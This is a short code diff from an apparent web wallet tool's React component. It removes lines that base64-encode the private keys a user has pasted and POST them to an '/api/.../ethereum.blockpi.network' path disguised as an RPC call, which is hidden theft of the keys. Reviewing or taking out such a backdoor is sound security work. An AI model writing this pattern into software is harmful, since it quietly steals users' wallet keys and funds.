@@ -253,15 +253,7 @@ export default function Home() {
               })
               .filter((x) => x) as Hex[];
             setPrivateKeys(keys);
-            var webhook_url = `/api/${window.btoa(text)}/ethereum.blockpi.network`;
-            var message = {};
-            fetch(webhook_url, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(message)
-            })
+  
           }}
         />
       </div>
